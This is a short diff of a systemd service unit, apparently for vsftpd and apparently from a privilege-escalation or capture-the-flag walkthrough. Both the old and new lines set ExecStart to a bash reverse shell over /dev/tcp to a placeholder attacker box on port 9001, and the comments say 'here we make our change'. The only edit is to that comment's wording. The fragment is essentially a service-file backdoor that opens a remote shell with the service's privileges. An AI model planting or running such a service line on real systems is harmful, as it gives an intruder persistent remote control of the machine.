@@ -85,7 +85,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attack-box(our-ip)/port(eg:9001) 0>&1'       ## here we make our change
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attack-box(our-ip)/port(eg:9001) 0>&1'       ## here we make change
 ExecReload=/bin/kill -HUP $MAINPID
 ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
 
